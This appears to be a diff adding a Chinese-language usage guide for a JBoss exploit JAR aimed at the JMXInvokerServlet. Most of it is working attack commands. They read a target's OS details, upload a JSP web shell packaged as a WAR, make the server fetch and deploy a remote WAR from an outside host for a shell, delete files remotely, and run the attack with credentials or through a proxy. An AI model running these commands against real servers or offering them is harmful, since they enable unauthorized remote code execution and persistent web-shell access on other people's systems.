@@ -1,0 +1,40 @@
+1. 查看系统名称
+
+java -jar jboss_exploit_fat.jar -i http://192.168.7.84:10081/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSName
+
+2. 查看系统版本
+
+java -jar jboss_exploit_fat.jar -i http://192.168.7.84:10081/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSVersion
+
+3.远程创建文件
+
+java -jar jboss_exploit_fat.jar -i http://192.168.7.84:10081/invoker/JMXInvokerServlet invoke jboss.admin:service=DeploymentFileRepository store myname.war index .jsp $content$ true -s java.lang.String;java.lang.String;java.lang.String;java.lang.String;java.lang.Boolean
+
+$content$内容是同目录下的shell.jsp文件内容
+
+即:将shell.jsp文件上传到服务器上，最终部署的war访问:
+http://192.168.7.84:10081/myname/index.jsp 
+如果有mynameok 表示部署成功
+使用client.htm客户端进行连接即可(需要修改ip等信息)
+
+4.远程部署war
+
+java -jar jboss_exploit_fat.jar -i http://192.168.7.84:10081/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy http://scriptsgenie.com/demo/test.war
+
+获得shell地址:
+http://192.168.7.84:10081/test/shell.jsp
+
+
+5.远程删除文件D:\jboss\server\default\deploy\management\myname.war\index.jsp文件
+
+java -jar jboss_exploit_fat.jar -i http://192.168.7.84:10081/invoker/JMXInvokerServlet invoke jboss.admin:service=DeploymentFileRepository remove myname index .jsp
+
+
+6.支持输入用户名和密码 带验证的情况
+
+java -jar jboss_exploit_fat.jar -u name -p password -i http://192.168.7.84:10081/invoker/JMXInvokerServlet invoke jboss.admin:service=DeploymentFileRepository remove myname index .jsp
+
+
+7.支持代理模式
+
+java -jar jboss_exploit_fat.jar -P http://127.0.0.1:8080 -i http://192.168.7.84:10081/invoker/JMXInvokerServlet invoke jboss.admin:service=DeploymentFileRepository remove myname index .jsp
